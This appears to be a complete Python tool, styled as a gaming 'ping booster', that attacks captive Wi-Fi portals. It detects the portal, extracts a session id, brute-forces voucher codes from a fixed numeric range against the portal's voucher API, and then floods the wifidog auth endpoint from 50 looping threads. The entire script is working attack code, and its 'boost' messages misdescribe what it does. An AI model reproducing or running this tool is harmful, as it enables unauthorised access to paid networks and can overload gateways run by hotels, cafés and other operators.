import requests, re, urllib3, time, threading, os, random, subprocess, json, sys
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_NAME = "🇵🇾 PEKIN GAMER-VIP 🇵🇾"
VERSION = "V4.0 (STABLE)"
VOUCHER_LIST = [str(i) for i in range(123400, 123501)]

def banner():
    os.system('clear')
    print("\033[93m" + " ="*38)
    print("\033[92m" + """
     ██████╗ ███████╗██╗  ██╗██╗███╗   ██╗
     ██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║
     ██████╔╝█████╗  █████╔╝ ██║██╔██╗ ██║
     ██╔═══╝ ██╔══╝  ██╔═██╗ ██║██║╚██╗██║
     ██║     ███████╗██║  ██╗██║██║ ╚████║
     ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝""")
    print(f"\033[95m 👑 STATUS: {USER_NAME} | \033[91m🔥 MODE: GAMING-ULTRA")
    print(f"\033[94m ⚡ VERSION: {VERSION} | 🔋 24/7 ANTI-DISCONNECT ACTIVE")
    print("\033[93m ="*38 + "\033[0m")

def game_boost_pulse(link):
    headers = {"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"}
    while True:
        try:
            requests.get(link, timeout=3, verify=False, headers=headers)
            sys.stdout.write(f"\r\033[92m[⚡] PEKIN-STABLE >>> PING BOOSTING... [{random.randint(5,25)}ms]\033[0m")
            sys.stdout.flush()
            time.sleep(0.01)
        except: time.sleep(1)

def launch():
    banner()
    session = requests.Session()
    while True:
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            p_url = r.url
            if "generate_204" not in p_url:
                parsed = urlparse(p_url)
                query = parse_qs(parsed.query)
                gw = query.get('gw_address', [parsed.netloc.split(':')[0]])[0]
                port = query.get('gw_port', ['2060'])[0]
                r1 = session.get(p_url, verify=False, timeout=6)
                m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
                n_url = urljoin(p_url, m.group(1)) if m else p_url
                r2 = session.get(n_url, verify=False, timeout=6)
                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
                if sid:
                    v_code = random.choice(VOUCHER_LIST)
                    session.post(f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/", json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                    auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                    for _ in range(50):
                        threading.Thread(target=game_boost_pulse, args=(auth_link,), daemon=True).start()
            time.sleep(5)
        except: time.sleep(5)

if __name__ == "__main__":
    launch()
